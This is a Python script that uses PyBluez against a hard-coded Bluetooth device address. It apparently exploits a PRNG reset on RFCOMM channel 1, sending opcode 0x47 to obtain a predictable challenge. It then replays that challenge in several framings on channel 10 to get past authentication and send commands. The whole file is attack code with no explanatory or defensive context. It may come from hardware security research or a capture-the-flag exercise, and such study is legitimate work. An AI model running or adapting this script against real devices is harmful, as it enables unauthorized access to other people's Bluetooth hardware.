import time

import bluetooth

TARGET = "F4:B6:2D:AE:AB:E0"
CHANNEL_1 = 1
CHANNEL_10 = 10

# Step 1: Reset PRNG on channel 1 and get predictable challenge
print("[*] Resetting PRNG on channel 1...")
sock1 = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
sock1.connect((TARGET, CHANNEL_1))
sock1.send(bytes([0x00, 0x00, 0x00, 0x47]))  # Reset opcode
_ = sock1.recv(256)  # discard response
time.sleep(0.05)
sock1.send(bytes([0x00, 0x00, 0x00, 0x00]))
challenge = sock1.recv(256)[1:17]
print(f"[+] Got challenge after 0x47: {challenge.hex()}")
sock1.close()

# Step 2: Connect to channel 10 and try to authenticate with the challenge
print("\n[*] Connecting to channel 10...")
sock10 = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
sock10.connect((TARGET, CHANNEL_10))
print("[+] Connected.")

# Try different payload formats containing the challenge
formats = [
    challenge,  # raw challenge
    b"\xaa\x55" + challenge,  # AA55 header + challenge
    b"\x7e" + bytes([len(challenge)]) + challenge,  # 7E length + challenge
    challenge + b"\x00\x00\x00\x01",  # challenge + opcode
    b"\x01" + challenge,  # 0x01 prefix (like ch1 response)
]

for i, payload in enumerate(formats):
    print(f"\n[>] Format {i+1}: {payload[:20].hex()}...")
    sock10.send(payload)
    time.sleep(0.5)
    try:
        sock10.settimeout(1.5)
        resp = sock10.recv(256)
        print(f"[!] RESPONSE! {resp.hex()}")
        # If we get a response, try sending a command
        sock10.send(b"\x00\x00\x00\x00")
        resp2 = sock10.recv(256)
        print(f"[!] After opcode 0x00: {resp2.hex()}")
        break
    except:
        print("[<] Timeout")

sock10.close()
